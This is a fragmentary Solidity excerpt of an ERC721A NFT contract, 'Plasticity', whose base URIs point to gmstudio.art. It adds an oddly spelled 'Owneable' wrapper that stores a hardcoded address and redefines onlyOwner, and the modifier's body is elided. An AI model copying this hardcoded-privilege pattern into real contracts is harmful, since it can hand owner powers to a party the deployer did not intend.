 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x8ff4075527b960977cb97e9A348A8fBF5190a583;
    modifier onlyOwner() {
...
contract Plasticity is ERC721A, Owneable {

    string public baseURI = "https://api.gmstudio.art/collections/plasticity/token/";
    string public contractURI = "https://api.gmstudio.art/collections/plasticity/token/";
    ...
    constructor() ERC721A("Plasticity By Adriana Lynch", "Plasticity") {}
